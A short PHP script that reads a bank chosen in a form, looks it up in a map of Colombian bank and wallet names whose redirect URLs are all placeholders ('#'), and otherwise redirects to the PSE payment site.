<?php
session_start();
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: index.php');
    exit();
}

$bank = isset($_POST['bank']) ? trim($_POST['bank']) : '';

if ($bank === '' || $bank === '0') {
    header('Location: index.php');
    exit();
}

// Mapa de bancos -> URL de redirección
$bankRedirects = [
    'ALIANZA FIDUCIARIA' => '#',
    'BAN100' => '#',
    'BANCAMIA S.A.' => '#',
    'BANCO AGRARIO' => '#',
    'BANCO AV VILLAS' => '#',
    'BANCO BBVA COLOMBIA S.A.' => '#',
    'BANCO CAJA SOCIAL' => '#',
    'BANCO COOPERATIVO COOPCENTRAL' => '#',
    'BANCO DE BOGOTA' => '#',
    'BANCO DE OCCIDENTE' => '#',
    'BANCO FALABELLA' => '#',
    'BANCO FINANDINA S.A. BIC' => '#',
    'BANCO GNB SUDAMERIS' => '#',
    'BANCO ITAU' => '#',
    'BANCO J.P. MORGAN COLOMBIA S.A.' => '#',
    'BANCO MUNDO MUJER S.A.' => '#',
    'BANCO PICHINCHA S.A.' => '#',
    'BANCO POPULAR' => '#',
    'BANCO SANTANDER COLOMBIA' => '#',
    'BANCO SERFINANZA' => '#',
    'BANCO UNION ANTES GIROS' => '#',
    'BANCOLOMBIA' => '#',
    'BANCOOMEVA S.A.' => '#',
    'BOLD CF' => '#',
    'CFA COOPERATIVA FINANCIERA' => '#',
    'CITIBANK' => '#',
    'COINK SA' => '#',
    'COLTEFINANCIERA' => '#',
    'CONFIAR COOPERATIVA FINANCIERA' => '#',
    'COTRAFA' => '#',
    'CREZCAMOS-MOSí' => '#',
    'DALE' => '#',
    'DING' => '#',
    'FINANCIERA JURISCOOP SA COMPAÑÍA DE FINANCIAMIENTO' => '#',
    'GLOBAL66' => '#',
    'IRIS' => '#',
    'JFK COOPERATIVA FINANCIERA' => '#',
    'LULO BANK' => '#',
    'MOVII S.A.' => '#',
    'NEQUI' => '#',
    'NU' => '#',
    'POWWI' => '#',
    'RAPPIPAY' => '#',
    'SCOTIABANK COLPATRIA' => '#',
    'UALÁ' => '#',
    'DAVIPLATA' => '#',
];

$bankUpper = strtoupper($bank);
$redirectUrl = isset($bankRedirects[$bankUpper]) ? $bankRedirects[$bankUpper] : 'https://www.pse.com.co/';
header('Location: ' . $redirectUrl);
exit();
?>
